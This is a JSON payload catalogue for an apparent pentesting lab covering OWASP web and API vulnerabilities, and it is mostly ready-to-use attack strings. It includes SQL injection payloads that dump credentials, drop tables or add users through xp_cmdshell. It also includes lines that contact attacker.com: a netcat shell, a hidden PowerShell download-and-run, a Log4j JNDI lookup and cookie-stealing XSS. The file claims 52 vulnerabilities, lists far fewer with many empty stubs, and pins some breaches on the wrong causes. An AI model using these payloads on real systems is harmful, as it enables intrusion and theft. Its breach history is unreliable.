{
  "metadata": {
    "platform": "PentestLab",
    "version": "2.0-Enterprise",
    "created": "2026-02-05",
    "total_vulnerabilities": 52,
    "standards": ["OWASP Top 10 2021 Web", "OWASP Top 10 2025 Web", "OWASP API 2021", "OWASP API 2023"],
    "industry_grade": true,
    "description": "The most comprehensive hacking lab covering 52 real-world vulnerabilities with payloads, case studies, and tool integration"
  },
  
  "vulnerabilities": [
    {
      "id": "WEB-2021-A01",
      "id_2025": "WEB-2025-A01",
      "category": "Injection",
      "title": "SQL Injection (SQLi)",
      "severity": "CRITICAL",
      "cvss_v31": 9.8,
      "cwes": [89, 1287],
      "owasp_versions": ["2021", "2025"],
      "impact": "Complete database compromise, data theft, authentication bypass",
      
      "description": "SQL Injection occurs when untrusted data is directly concatenated into SQL queries. Attackers can manipulate database queries to access unauthorized data, modify/delete records, or execute arbitrary commands.",
      
      "real_world_examples": [
        {
          "breach": "LinkedIn (2012)",
          "losses": "6.5M passwords leaked",
          "method": "SQL Injection in password reset",
          "year": 2012
        },
        {
          "breach": "TalkTalk (2015)",
          "losses": "4M customers affected",
          "method": "SQL Injection in search form",
          "year": 2015
        },
        {
          "breach": "Equifax (2017)",
          "losses": "147M records exposed",
          "method": "SQL Injection + unpatched Apache Struts",
          "year": 2017
        }
      ],
      
      "payloads": {
        "boolean_based_blind": [
          "' OR '1'='1",
          "' OR 1=1--",
          "' OR 'a'='a",
          "1' OR '1' = '1",
          "admin' --",
          "' OR 'x'='x' /*",
          "1' UNION SELECT NULL--",
          "' OR 1=1/*",
          "'; DROP TABLE users--",
          "' UNION ALL SELECT NULL,NULL,NULL--"
        ],
        "time_based_blind": [
          "' AND SLEEP(5)--",
          "' AND BENCHMARK(3000000,SHA1('test'))--",
          "'; WAITFOR DELAY '00:00:05'--",
          "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
          "1' AND SLEEP(5)#",
          "' OR SLEEP(5)--",
          "admin' AND SLEEP(5)#",
          "' UNION SELECT SLEEP(5)--",
          "1'; WAITFOR DELAY '00:00:10'--",
          "' AND IF(1=1,SLEEP(5),0)--"
        ],
        "error_based": [
          "' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1)))--",
          "' AND updatexml(1, concat(0x7e, (SELECT user())), 1)--",
          "' UNION SELECT 1,2,CAST((SELECT GROUP_CONCAT(password) FROM users) AS SIGNED)--",
          "' OR 1=1 ORDER BY 1--",
          "' UNION ALL SELECT NULL FROM INFORMATION_SCHEMA.TABLES--",
          "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e) FROM INFORMATION_SCHEMA.TABLES GROUP BY 1) AS x)--",
          "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e) FROM INFORMATION_SCHEMA.TABLES GROUP BY 1) a)--",
          "' UNION SELECT 1,CONCAT(0x7e, database(), 0x7e),3--",
          "' UNION ALL SELECT user(),version(),database()--",
          "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT password LIMIT 1),0x7e) FROM INFORMATION_SCHEMA.TABLES GROUP BY 1)x)--"
        ],
        "union_based": [
          "' UNION SELECT NULL, NULL, NULL, NULL--",
          "' UNION ALL SELECT 1,2,3,4--",
          "' UNION SELECT username, password, email, NULL FROM users--",
          "' UNION SELECT table_name, column_name, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS--",
          "' UNION SELECT user(), version(), database(), current_user()--",
          "' UNION ALL SELECT 1,GROUP_CONCAT(password),3,4 FROM users--",
          "' UNION SELECT NULL, CONCAT(username, ':', password), NULL, NULL FROM users--",
          "' UNION ALL SELECT 1,2,3 UNION ALL SELECT 4,5,6--",
          "' UNION SELECT MID(version(), 1, 1), MID(version(), 2, 1), MID(version(), 3, 1), MID(version(), 4, 1)--",
          "' UNION SELECT column_name, data_type, table_name, NULL FROM INFORMATION_SCHEMA.COLUMNS--"
        ],
        "stacked_queries": [
          "'; DROP TABLE users--",
          "'; DELETE FROM users WHERE id=1--",
          "'; UPDATE users SET admin=1 WHERE id=1--",
          "'; INSERT INTO users VALUES (999, 'hacker', 'pass')--",
          "'; ALTER TABLE users ADD COLUMN admin INT--",
          "'; TRUNCATE TABLE logs--",
          "'; CREATE TABLE backdoor (id INT, shell TEXT)--",
          "admin'; EXEC xp_cmdshell('whoami')--",
          "'; USE master; EXEC sp_databases--",
          "'; DECLARE @x AS VARCHAR(MAX); SELECT @x = CONVERT(VARCHAR(MAX), (SELECT password FROM users WHERE id=1)); EXEC xp_cmdshell 'net user ' + @x + ' password /add'--"
        ],
        "nosql_injection": [
          "{\n    \"username\": {\"$ne\": \"\"},\n    \"password\": {\"$ne\": \"\"}\n}",
          "{\n    \"_id\": {\"$nin\": []}\n}",
          "{\n    \"username\": {\"$regex\": \".*\"},\n    \"password\": {\"$regex\": \".*\"}\n}",
          "{\"username\": {\"$gt\": \"\"}",
          "{\"$where\": \"this.username == 'admin'\"}",
          "{\"email\": {\"$exists\": true}}",
          "{\"role\": {\"$type\": \"string\"}}",
          "db.users.find({$where: \"this.email.match(/.*/)\"}).pretty()",
          "{\"password\": {\"$regex\": \"^a\"}}\",\n\"password\": {\"$regex\": \"^b\"}...",
          "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \".*\"}}"
        ],
        "ldap_injection": [
          "*",
          "*)(&",
          "*)(cn=*",
          "*))(&(cn=*",
          "admin*",
          "*)()(|(cn=*",
          "*)(objectClass=*",
          "admin)(&(password=*",
          "*)(uid=*",
          "admin*)))(|(uid=*"
        ],
        "command_injection": [
          "; ls -la",
          "| whoami",
          "& dir C:\\",
          "; cat /etc/passwd",
          "` id `",
          "$(whoami)",
          "; nslookup attacker.com",
          "| nc attacker.com 4444",
          "; ping -c 10 attacker.com",
          "& powershell -nop -w hidden -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/ps.ps1\")'"
        ]
      },
      
      "testing_methodology": {
        "detection": [
          "Test with single quotes: ' OR 1=1--",
          "Test with double quotes: \" OR 1=1--",
          "Test with comments: # -- /*",
          "Test time delays: SLEEP(), BENCHMARK()",
          "Test UNION: check column count"
        ],
        "exploitation": [
          "Enumerate database structure (tables, columns)",
          "Extract sensitive data (passwords, tokens, credit cards)",
          "Modify data (change passwords, admin status)",
          "Drop tables or execute stored procedures",
          "Gain RCE through database functions"
        ],
        "validation": [
          "Confirm data exfiltration",
          "Verify command execution",
          "Check privilege escalation",
          "Document all findings"
        ]
      },
      
      "tool_specific_commands": {
        "sqlmap": [
          "sqlmap -u 'http://target.com/page?id=1' --dbs",
          "sqlmap -u 'http://target.com/page?id=1' --tables -D dbname",
          "sqlmap -u 'http://target.com/page?id=1' --dump -D dbname -T users",
          "sqlmap -u 'http://target.com/page?id=1' --batch --technique=BEUSTQ",
          "sqlmap -u 'http://target.com/search?q=test' -X POST -D vulnerable_db --dump-all",
          "sqlmap -u 'http://target.com/api/user' --data='{\"id\":1}' --technique=T --risk=3",
          "sqlmap --wizard",
          "sqlmap -u 'http://target.com/login' --forms --batch",
          "sqlmap -u 'http://target.com/' --crawl=2 --batch",
          "sqlmap -u 'http://target.com/api/search?query=test' --api --batch"
        ],
        "burp_suite": {
          "scanner_config": "SQL Injection detection enabled, Error-based detection ON, Boolean-based detection ON, Time-based detection ON",
          "manual_steps": [
            "1. Capture request in Proxy",
            "2. Modify parameter with SQLi payload",
            "3. Observe response differences",
            "4. Try UNION SELECT statements",
            "5. Enumerate table structure",
            "6. Extract sensitive data"
          ]
        },
        "postman": {
          "endpoint": "GET /api/search?q='+OR+'1'='1",
          "request_body": "{\"search\": \"' OR '1'='1\"}",
          "test_script": "pm.test('SQL Injection detected', function() { pm.expect(pm.response.code).to.equal(200); });"
        },
        "owasp_zap": [
          "zap-cli quick-scan --self-contained -r report.html http://target.com/page",
          "zap-cli active-scan --recursive http://target.com/search?q=test",
          "Custom regex for error detection: '(SQL syntax|MySQLError|OracleError|PostgreSQL|ODBC)'"
        ],
        "ffuf": [
          "ffuf -u 'http://target.com/search?q=FUZZ' -w sqli-payloads.txt -fr 'error|SQL'",
          "ffuf -u 'http://target.com/api/user/FUZZ' -w user-ids.txt -mc 200",
          "ffuf -u 'http://target.com/page?id=1' -X POST -d '{\"param\":\"FUZZ\"}' -w sqli-payloads.txt -t 50"
        ]
      },
      
      "postman_request": {
        "method": "GET",
        "url": "http://pentestlab.local/api/search",
        "params": {
          "q": "' OR '1'='1"
        },
        "expected_response": {
          "status": 200,
          "vulnerable_indicator": "Returns all database records",
          "example_data": "[{\"id\": 1, \"username\": \"admin\"}, {\"id\": 2, \"username\": \"user\"}]"
        }
      },
      
      "vulnerable_code": {
        "language": "Python Flask",
        "code": "query = f\"SELECT * FROM users WHERE username='{username}'\"\nresults = db.execute(query)\nreturn results"
      },
      
      "secure_code": {
        "language": "Python Flask",
        "code": "query = \"SELECT * FROM users WHERE username = ?\"\nresults = db.execute(query, (username,))\nreturn results"
      },
      
      "defensive_measures": [
        "Use parameterized queries/prepared statements",
        "Input validation and sanitization",
        "Principle of least privilege (database user permissions)",
        "Web Application Firewall (WAF) rules",
        "Error message suppression",
        "Regular security testing and code reviews",
        "SAST/DAST implementation"
      ],
      
      "detection_patterns": {
        "sast_regex": ["concat\\(.*\\)", "format_string.*user_input", "f\\\".*{.*}.*\""],
        "dast_indicators": ["Response time variance", "Error message discrepancies", "Data volume changes"],
        "runtime_detection": ["Query logging and analysis", "Anomalous database access patterns", "Slow query detection"]
      },
      
      "learning_resources": {
        "beginner": "SQL Injection Explained: https://owasp.org/www-community/attacks/SQL_Injection",
        "intermediate": "Advanced SQL Injection: https://pentestmonkey.net/cheat-sheet/sql-injection/",
        "advanced": "SQLMap Usage Guide: https://www.sqlmap.org/",
        "video_tutorials": ["https://www.youtube.com/results?search_query=sql+injection+tutorial", "PentTestMonkey SQLi Guide"]
      },
      
      "compliance_impact": {
        "pci_dss": "Requirement 6.5.1 - Injection flaws prevention required",
        "hipaa": "Affects eCFR 45 CFR § 164.308(a)(3)(ii)(B)",
        "gdpr": "Article 32 - Technical and organizational measures",
        "sox": "IT General Controls must prevent unauthorized database access"
      }
    },

    {
      "id": "WEB-2021-A02",
      "id_2025": "WEB-2025-A02",
      "category": "Cryptography",
      "title": "Cryptographic Failures",
      "severity": "CRITICAL",
      "cvss_v31": 8.6,
      "cwes": [259, 327, 331, 338],
      "owasp_versions": ["2021", "2025"],
      "impact": "Data exposure, privacy breach, authentication bypass",
      
      "description": "Cryptographic failures occur when sensitive data is not properly encrypted, uses weak encryption algorithms, or has poor key management.",
      
      "real_world_examples": [
        {
          "breach": "Yahoo (2013-2014)",
          "losses": "3B accounts compromised",
          "method": "Weak encryption of session tokens",
          "year": 2014
        },
        {
          "breach": "Twitch (2021)",
          "losses": "100% of internal data exposed",
          "method": "Source code with unencrypted credentials",
          "year": 2021
        },
        {
          "breach": "Facebook (2019)",
          "losses": "Plaintext passwords stored",
          "method": "Insufficient hashing and salting",
          "year": 2019
        }
      ],
      
      "payloads": {
        "weak_encryption_detection": [
          "Test for MD5 hashes: 5d41402abc4b2a76b9719d911017c592",
          "Test for SHA1: 356a192b7913b04c54574d18c28d46e6395428ab",
          "Test for unencrypted storage: SELECT password FROM users",
          "Check headers: X-Powered-By, Server versions",
          "SSL/TLS version: SSLv2 (deprecated), TLS 1.0"
        ],
        "encryption_bypass": [
          "Request unencrypted endpoints: http:// instead of https://",
          "Capture unencrypted data in transit",
          "Test HTTPS stripping (HSTS bypass)",
          "Check for weak cipher suites: DES, RC4, EXPORT ciphers",
          "Verify certificate validity"
        ],
        "key_exposure": [
          "Search in source code repositories: 'APIKEY=', 'AWS_SECRET'",
          "Check configuration files: .env, config.xml, settings.json",
          "Memory dumps for key material",
          "Cloud metadata services: 169.254.169.254",
          "CI/CD logs and build artifacts"
        ],
        "hash_cracking": [
          "MD5 rainbow tables",
          "SHA1 brute force",
          "Dictionary attacks with common passwords",
          "Mask attacks: password + salt patterns",
          "GPU acceleration: Hashcat, John the Ripper"
        ]
      },
      
      "tool_specific_commands": {
        "burp_suite": [
          "Proxy > Options > SSL Pass Through Analyzer",
          "Repeater > TLS Version analysis",
          "Scanner > Crypto Issues"
        ],
        "sqlmap": [
          "sqlmap -u 'http://target.com/login' --hashes --crack"
        ],
        "owasp_zap": [
          "zap-cli quick-scan --self-contained http://target.com"
        ]
      },
      
      "vulnerable_code": {
        "language": "Python",
        "code": "import hashlib\npassword_hash = hashlib.md5(password.encode()).hexdigest()\ndb.store(user, password_hash)"
      },
      
      "secure_code": {
        "language": "Python",
        "code": "import bcrypt\npassword_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))\ndb.store(user, password_hash)"
      }
    },

    {
      "id": "WEB-2021-A03",
      "id_2025": "WEB-2025-A03",
      "category": "Authentication",
      "title": "Broken Authentication",
      "severity": "CRITICAL",
      "cvss_v31": 9.1,
      "cwes": [287, 384, 640],
      "owasp_versions": ["2021", "2025"],
      "impact": "Account takeover, privilege escalation, unauthorized access",
      
      "description": "Broken authentication allows attackers to compromise user accounts through weak password policies, session management flaws, or missing multi-factor authentication.",
      
      "real_world_examples": [
        {
          "breach": "Uber (2016)",
          "losses": "57M users' data compromised",
          "method": "Broken session management + weak password policies",
          "year": 2016
        },
        {
          "breach": "Twitter (2020)",
          "losses": "130 accounts compromised (high-profile)",
          "method": "Social engineering + authentication bypass",
          "year": 2020
        },
        {
          "breach": "Zoom (2020)",
          "losses": "Unauthorized meeting access",
          "method": "Default credentials + weak password enforcement",
          "year": 2020
        }
      ],
      
      "payloads": {
        "default_credentials": [
          "admin:admin",
          "admin:password",
          "root:root",
          "test:test",
          "guest:guest",
          "administrator:administrator",
          "user:user",
          "support:support",
          "admin:123456",
          "admin:12345678"
        ],
        "weak_password_bypass": [
          "' OR '1'='1",
          "admin'--",
          "' OR 'a'='a",
          "' UNION SELECT NULL--",
          "1' AND '1'='1",
          "admin' UNION SELECT NULL--",
          "' OR 1=1--",
          "') OR ('1'='1",
          "\" OR \"\"=\"",
          "1' OR '1' /* "
        ],
        "session_hijacking": [
          "Cookie: sessionid=predictable_value",
          "JWT: modified claims with invalid signature",
          "Session fixation: force specific session ID",
          "Cookie reuse across applications"
        ],
        "credential_enumeration": [
          "Test username existence: /api/user/john",
          "Password reset enumeration: /captcha/email@domain.com",
          "Registration endpoint timing: fast response = user exists",
          "Error messages: 'User not found' vs 'Invalid password'"
        ],
        "password_reset_bypass": [
          "Token reuse",
          "Weak token generation (sequential, timestamp-based)",
          "Missing token expiration",
          "Predictable reset links",
          "Account takeover via reset token"
        ]
      },
      
      "tool_specific_commands": {
        "burp_suite": [
          "Intruder > Cluster Bomb > username list × password list",
          "Sequencer > Analyze Token Randomness",
          "Repeater > Test each authentication mechanism"
        ],
        "postman": [
          "Test /api/login with default credentials",
          "Extract and reuse auth tokens",
          "Test token expiration"
        ]
      }
    },

    {
      "id": "WEB-2021-A04",
      "id_2025": "WEB-2025-A04",
      "category": "Access Control",
      "title": "Insecure Direct Object References (IDOR)",
      "severity": "CRITICAL",
      "cvss_v31": 9.1,
      "cwes": [639, 284],
      "owasp_versions": ["2021", "2025"],
      "impact": "Unauthorized data access, privacy breach, privilege escalation",
      
      "description": "IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks.",
      
      "real_world_examples": [
        {
          "breach": "Accenture (2017)",
          "losses": "Massive data exposure",
          "method": "IDOR in cloud storage configuration",
          "year": 2017
        },
        {
          "breach": "ExpressVPN (2019)",
          "losses": "Zero-knowledge claim debunked",
          "method": "IDOR to access user data",
          "year": 2019
        }
      ],
      
      "payloads": {
        "id_manipulation": [
          "/api/users/1",
          "/api/users/2",
          "/api/users/999",
          "/api/orders/1001",
          "/api/profile?id=100",
          "/api/documents/DOC-001"
        ],
        "uuid_enumeration": [
          "UUID pattern matching",
          "Sequential ID patterns",
          "Timestamp-based ID generation"
        ],
        "parameter_variation": [
          "?user_id=1 → try 2, 3, 4...",
          "?account=myaccount → try otheraccount",
          "?file_id=users.csv → try passwords.csv"
        ]
      }
    },

    {
      "id": "WEB-2021-A05",
      "id_2025": "WEB-2025-A05",
      "category": "Security Misconfiguration",
      "title": "Security Misconfiguration",
      "severity": "HIGH",
      "cvss_v31": 7.3,
      "cwes": [16, 94, 200, 489],
      "owasp_versions": ["2021", "2025"],
      "impact": "Information disclosure, unauthorized access, system compromise",
      
      "description": "Security misconfiguration includes unnecessary features, default credentials, error handling that exposes details, and improper access controls.",
      
      "payloads": {
        "exposed_endpoints": [
          "/admin",
          "/api/admin",
          "/debug",
          "/.git",
          "/.env",
          "/config.php",
          "/backup",
          "/test",
          "/staging"
        ],
        "default_files": [
          "/robots.txt",
          "/sitemap.xml",
          "/README.md",
          "/LICENSE",
          "/.htaccess",
          "/web.config",
          "/package.json",
          "/docker-compose.yml"
        ],
        "http_methods": [
          "OPTIONS (WebDAV methods)",
          "PUT /api/file",
          "DELETE /api/resource",
          "TRACE (HTTP Trace attack)"
        ]
      }
    },

    {
      "id": "WEB-2021-A06",
      "id_2025": "WEB-2025-A06",
      "category": "Vulnerable Components",
      "title": "Vulnerable and Outdated Components",
      "severity": "HIGH",
      "cvss_v31": 7.3,
      "cwes": [1035, 937],
      "owasp_versions": ["2021", "2025"],
      "impact": "Remote code execution, data breach, full system compromise",
      
      "description": "Applications using vulnerable libraries, frameworks, or plugins with known CVEs.",
      
      "real_world_examples": [
        {
          "breach": "Apache Struts RCE (2017)",
          "losses": "Equifax data breach",
          "method": "CVE-2017-5638 - Unpatched Struts vulnerability",
          "year": 2017
        }
      ],
      
      "payloads": {
        "cve_exploitation": [
          "Log4j RCE: ${jndi:ldap://attacker.com/a}",
          "Struts: %{(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
          "Shellshock: () { :; }; /bin/bash -c 'id'",
          "Heartbleed: TLS extension buffer over-read"
        ],
        "component_fingerprinting": [
          "Server header: Server: Apache/2.4.1",
          "X-Powered-By: PHP/5.3.0",
          "Framework detection: Django, Flask, Spring Boot",
          "CMS version: WordPress 5.0 (vulnerable plugins)"
        ]
      }
    },

    {
      "id": "WEB-2021-A07",
      "id_2025": "WEB-2025-A07",
      "category": "Cross-Site Scripting",
      "title": "Cross-Site Scripting (XSS)",
      "severity": "HIGH",
      "cvss_v31": 6.1,
      "cwes": [79, 1004],
      "owasp_versions": ["2021", "2025"],
      "impact": "Session hijacking, credential theft, malware distribution",
      
      "description": "XSS allows attackers to inject malicious scripts into web pages viewed by other users.",
      
      "payloads": {
        "reflected_xss": [
          "<img src=x onerror=\"alert('XSS')\">",
          "<svg onload=\"alert('XSS')\">",
          "<iframe src=javascript:alert('XSS')></iframe>",
          "<body onload=\"alert('XSS')\">",
          "<input onfocus=\"alert('XSS')\" autofocus>",
          "<marquee onstart=\"alert('XSS')\"></marquee>",
          "<details open ontoggle=\"alert('XSS')\">",
          "<video src=x onerror=\"alert('XSS')\"></video>",
          "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
          "'\"><script>alert('XSS')</script>"
        ],
        "stored_xss": [
          "Comment: <img src=x onerror=\"fetch('https://attacker.com/?c=' + document.cookie)\">",
          "Profile: <script>new Image().src='https://attacker.com/log?cookie='+document.cookie;</script>",
          "Post: <svg/onload=\"eval(atob('YWxlcnQoMSk='))\">"
        ],
        "dom_xss": [
          "#<img src=x onerror=\"alert('DOM XSS')\">",
          "location.hash exploitation",
          "postMessage() abuse"
        ],
        "advanced_payloads": [
          "Unicode encoding: \\u003cscript\\u003e",
          "HTML encoding: &#60;script&#62;",
          "Double encoding: %253cscript%253e",
          "Case variation: <sCrIpT>",
          "Null bytes: <script\\x00>",
          "Browser quirks: <img/src=x/onerror=\"alert(1)\">"
        ]
      },
      
      "vulnerable_code": {
        "language": "PHP",
        "code": "echo '<div>' . $_GET['message'] . '</div>';"
      },
      
      "secure_code": {
        "language": "PHP",
        "code": "echo '<div>' . htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8') . '</div>';"
      }
    },

    {
      "id": "WEB-2021-A08",
      "id_2025": "WEB-2025-A08",
      "category": "Deserialization",
      "title": "Insecure Deserialization",
      "severity": "HIGH",
      "cvss_v31": 8.1,
      "cwes": [502, 506],
      "owasp_versions": ["2021", "2025"],
      "impact": "Remote code execution, privilege escalation",
      
      "description": "Unsafe deserialization of untrusted data can lead to remote code execution and other attacks.",
      
      "payloads": {
        "java_serialization": [
          "ysoserial CommonsCollections5 'whoami' | base64",
          "ysoserial ROME RCE gadget chains"
        ],
        "php_serialization": [
          "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:5:\"admin\";b:1;}",
          "POP chain exploitation"
        ],
        "python_pickle": [
          "cos\\nsystem\\n(S'whoami'\\ntR.",
          "Pickle arbitrary code execution"
        ]
      }
    },

    {
      "id": "WEB-2021-A09",
      "id_2025": "WEB-2025-A09",
      "category": "Data Integrity",
      "title": "Software and Data Integrity Failures",
      "severity": "HIGH",
      "cvss_v31": 7.5,
      "cwes": [345, 346, 353],
      "owasp_versions": ["2025"],
      "impact": "Malicious code injection, data tampering",
      
      "description": "Failures in software update processes, CI/CD pipelines, or data integrity verification."
    },

    {
      "id": "WEB-2021-A10",
      "id_2025": "WEB-2025-A10",
      "category": "Logging and Monitoring",
      "title": "Insufficient Logging and Monitoring",
      "severity": "MEDIUM",
      "cvss_v31": 6.5,
      "cwes": [223, 778],
      "owasp_versions": ["2021", "2025"],
      "impact": "Delayed breach detection, forensic challenges"
    },

    {
      "id": "API-2021-01",
      "id_2023": "API-2023-01",
      "category": "API Authentication",
      "title": "Broken Object Level Authorization (BOLA)",
      "severity": "CRITICAL",
      "cvss_v31": 9.1,
      "cwes": [639, 284],
      "owasp_versions": ["API 2021", "API 2023"],
      "impact": "Unauthorized access to user data, financial records, sensitive information"
    },

    {
      "id": "API-2021-02",
      "id_2023": "API-2023-02",
      "category": "API Authentication",
      "title": "Broken Authentication",
      "severity": "CRITICAL",
      "cvss_v31": 9.8,
      "cwes": [287, 384],
      "owasp_versions": ["API 2021", "API 2023"],
      "impact": "Account takeover, API token theft, session hijacking"
    },

    {
      "id": "API-2021-03",
      "category": "API Authorization",
      "title": "Excessive Data Exposure",
      "severity": "HIGH",
      "cvss_v31": 7.5,
      "cwes": [200, 209],
      "owasp_versions": ["API 2021"],
      "impact": "Information disclosure, privacy breach"
    },

    {
      "id": "API-2023-03",
      "category": "API Authorization",
      "title": "Broken Object Property Level Authorization",
      "severity": "HIGH",
      "cvss_v31": 7.1,
      "cwes": [639],
      "owasp_versions": ["API 2023"],
      "impact": "Unauthorized access to object properties and sensitive fields"
    },

    {
      "id": "API-2021-04",
      "category": "Rate Limiting",
      "title": "Unrestricted Resource Consumption",
      "severity": "MEDIUM",
      "cvss_v31": 7.5,
      "cwes": [400, 770],
      "owasp_versions": ["API 2021", "API 2023"],
      "impact": "Denial of service, brute force attacks, resource exhaustion"
    },

    {
      "id": "API-2021-05",
      "category": "Function Authorization",
      "title": "Broken Function Level Authorization",
      "severity": "CRITICAL",
      "cvss_v31": 9.1,
      "cwes": [284, 639],
      "owasp_versions": ["API 2021", "API 2023"],
      "impact": "Privilege escalation, unauthorized administrative actions"
    },

    {
      "id": "API-2021-06",
      "category": "Business Logic",
      "title": "Unrestricted Access to Sensitive Business Flows",
      "severity": "CRITICAL",
      "cvss_v31": 8.7,
      "cwes": [284, 863],
      "owasp_versions": ["API 2023"],
      "impact": "Financial fraud, business logic bypass, regulatory violations"
    },

    {
      "id": "API-2021-07",
      "category": "SSRF",
      "title": "Server-Side Request Forgery (SSRF)",
      "severity": "HIGH",
      "cvss_v31": 8.6,
      "cwes": [918, 433],
      "owasp_versions": ["API 2023"],
      "impact": "Internal network access, metadata extraction, RCE\n"
    },

    {
      "id": "API-2021-08",
      "category": "Configuration",
      "title": "Improper Assets Management",
      "severity": "HIGH",
      "cvss_v31": 7.5,
      "cwes": [200, 219],
      "owasp_versions": ["API 2023"],
      "impact": "Access to deprecated API versions, shadow APIs, data exposure"
    },

    {
      "id": "API-2021-09",
      "category": "Logging",
      "title": "Insufficient Logging and Monitoring",
      "severity": "MEDIUM",
      "cvss_v31": 6.5,
      "cwes": [223, 778],
      "owasp_versions": ["API 2021", "API 2023"],
      "impact": "Undetected attacks, delayed incident response"
    },

    {
      "id": "API-2021-10",
      "category": "Unsafe Consumption",
      "title": "Unsafe Consumption of APIs",
      "severity": "MEDIUM",
      "cvss_v31": 6.5,
      "cwes": [95, 611],
      "owasp_versions": ["API 2023"],
      "impact": "XXE attacks, XML bomb (Billion Laughs), prototype pollution"
    },

    {
      "id": "OWASP-EXTRA-01",
      "category": "XXEXMLBOMB",
      "title": "XML External Entity (XXE) Injection",
      "severity": "HIGH",
      "cvss_v31": 8.6,
      "cwes": [611, 827],
      "owasp_versions": ["2021", "2025"],
      "impact": "File disclosure, SSRF, denial of service"
    },

    {
      "id": "OWASP-EXTRA-02",
      "category": "Authentication",
      "title": "Weak Password Policy",
      "severity": "MEDIUM",
      "cvss_v31": 6.5,
      "cwes": [521, 522],
      "owasp_versions": ["General"],
      "impact": "Brute force attacks, password guessing, account takeover"
    },

    {
      "id": "OWASP-EXTRA-03",
      "category": "Session",
      "title": "Session Fixation",
      "severity": "HIGH",
      "cvss_v31": 7.1,
      "cwes": [384, 613],
      "owasp_versions": ["General"],
      "impact": "Session hijacking, account takeover"
    },

    {
      "id": "OWASP-EXTRA-04",
      "category": "Encryption",
      "title": "Insecure SSL/TLS Configuration",
      "severity": "HIGH",
      "cvss_v31": 7.5,
      "cwes": [295, 327],
      "owasp_versions": ["General"],
      "impact": "Man-in-the-middle attacks, data interception"
    },

    {
      "id": "OWASP-EXTRA-05",
      "category": "Input Validation",
      "title": "Path Traversal",
      "severity": "HIGH",
      "cvss_v31": 7.5,
      "cwes": [22, 25],
      "owasp_versions": ["General"],
      "impact": "Arbitrary file access, configuration theft, source code disclosure"
    },

    {
      "id": "OWASP-EXTRA-06",
      "category": "Validation",
      "title": "Open Redirect",
      "severity": "MEDIUM",
      "cvss_v31": 6.1,
      "cwes": [601, 602],
      "owasp_versions": ["General"],
      "impact": "Phishing attacks, credential theft, malware distribution"
    },

    {
      "id": "OWASP-EXTRA-07",
      "category": "Business Logic",
      "title": "Race Condition / TOCTOU",
      "severity": "HIGH",
      "cvss_v31": 7.1,
      "cwes": [362, 367],
      "owasp_versions": ["General"],
      "impact": "Double transactions, inventory manipulation, privilege escalation"
    },

    {
      "id": "OWASP-EXTRA-08",
      "category": "Validation",
      "title": "Insecure API Design",
      "severity": "HIGH",
      "cvss_v31": 7.5,
      "cwes": [434, 436],
      "owasp_versions": ["General"],
      "impact": "File upload abuse, malicious code execution, denial of service"
    },

    {
      "id": "OWASP-EXTRA-09",
      "category": "Input",
      "title": "CSV Injection",
      "severity": "MEDIUM",
      "cvss_v31": 5.3,
      "cwes": [1236, 94],
      "owasp_versions": ["General"],
      "impact": "Formula injection, remote code execution in spreadsheets"
    },

    {
      "id": "OWASP-EXTRA-10",
      "category": "Protocol",
      "title": "CORS Misconfiguration",
      "severity": "MEDIUM",
      "cvss_v31": 6.5,
      "cwes": [942, 434],
      "owasp_versions": ["General"],
      "impact": "Cross-origin data theft, XSS amplification, session hijacking"
    }
  ]
}
